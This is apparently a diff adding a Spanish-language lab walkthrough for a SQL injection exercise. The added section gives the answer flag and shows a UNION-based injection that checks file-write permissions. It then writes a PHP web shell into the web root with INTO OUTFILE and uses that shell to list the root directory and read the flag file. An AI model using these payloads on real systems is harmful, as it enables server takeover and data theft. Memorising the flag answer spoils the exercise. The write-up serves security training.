@@ -256,3 +256,53 @@ Obtenemos:
 ## 3. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.
 **Respuesta:** `061b1aeb94dec6bf5d9c27032b3c1d8d`
 
+#### Procedimiento:
+
+1. Escribimos en la pagina:
+
+```
+cn ') union select 1,2,variable_value,4 from information_schema.global_variables where variable_name = "secure_file_priv"-- -
+```
+
+No sale nada. Eso significa que tenemos permisos de escritura/lectura.
+
+2. Carguemos el payload
+
+```
+cn ') union select "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/www/chattr-prod/shell.php'-- -
+```
+
+- El `$_REQUEST[0]` obtiene un parámetro llamado 0 de la petición HTTP, y `system(...)` intenta ejecutar ese valor como un comando del sistema.
+- `into outfile '/var/www/chattr-prod/shell.php'` le dice a MariaDB: "Toma el resultado de este SELECT y escríbelo en este archivo del sistema."
+
+
+3. Vamos a https://<IP>:<PORT>/shell.php
+
+Por ejemplo, vamos a: `https://<IP>:<PORT>/shell.php?0=whoami` y nos saldra `www-data`.
+
+
+4. Con eso ya sabemos que el payload esta correctamente cargado
+
+La pregunta nos dice que el codigo de ejecucion es algo asi `/flag_XXXXXX.txt `
+
+Entonces vamos a: `https://<IP>:<PORT>/shell.php?0=cat%20/flag_[aqui_va_algo].txt`
+Ojo: el simbolo `%20` significa espacio solo que esta en formatdo url por si acaso
+
+Ahora debemos encontrar ese [aqui_va_algo]
+
+5. Escribamos la url `https://[ip]:[port]/shell.php?0=ls%20/`
+
+Con eso estamos, basicamente, ejecutando: `ls /`
+Como sabemos por linux, `ls` sirve para mostrar todos los archivo de `/` que es la carpeta root
+
+![ls](imgs/ls.png)
+
+Uno de esos es `flag_876a4c.txt`!!!
+
+6. Ya lo tenemos!!!
+
+Simplemente vamos alla: `https://<IP>:<PORT>/shell.php?0=cat%20/flag_876a4c.txt` y tenemos la respuesta!!!
+
+![respuesta3](imgs/answer3.png)
+
+
